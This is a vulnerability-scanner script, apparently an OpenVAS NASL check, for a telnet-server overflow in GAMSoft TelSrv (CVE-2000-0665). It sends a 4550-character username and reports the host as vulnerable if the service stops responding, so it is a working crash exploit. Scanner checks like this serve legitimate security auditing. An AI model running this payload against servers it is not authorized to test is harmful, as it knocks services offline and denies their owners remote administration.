if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10474" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 1478 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2000-0665" );
	script_name( "GAMSoft TelSrv 1.4/1.5 Overflow" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2000 Prizm <Prizm@RESENTMENT.org" );
	script_family( "Denial of Service" );
	script_dependencies( "telnetserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/telnet", 23 );
	script_mandatory_keys( "telnet/banner/available" );
	script_tag( name: "solution", value: "Contact your vendor for a patch." );
	script_tag( name: "summary", value: "It is possible to crash the remote telnet server by
  sending a username that is 4550 characters long." );
	script_tag( name: "impact", value: "An attacker may use this flaw to prevent you
  from administering this host remotely." );
	script_tag( name: "solution_type", value: "Mitigation" );
	exit( 0 );
}
require("telnet_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = telnet_get_port( default: 23 );
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
r = telnet_negotiate( socket: soc );
r2 = recv( socket: soc, length: 4096 );
r = r + r2;
if(!r){
	close( soc );
	exit( 0 );
}
r = recv( socket: soc, length: 8192 );
if(ContainsString( r, "5 second delay" )){
	sleep( 5 );
}
r = recv( socket: soc, length: 8192 );
req = NASLString( crap( 4550 ), "\\r\\n" );
send( socket: soc, data: req );
close( soc );
sleep( 1 );
soc2 = open_sock_tcp( port );
if( !soc2 ) {
	security_message( port: port );
}
else {
	r = telnet_negotiate( socket: soc2 );
	r2 = recv( socket: soc2, length: 4096 );
	r = r + r2;
	close( soc2 );
	if(!r){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

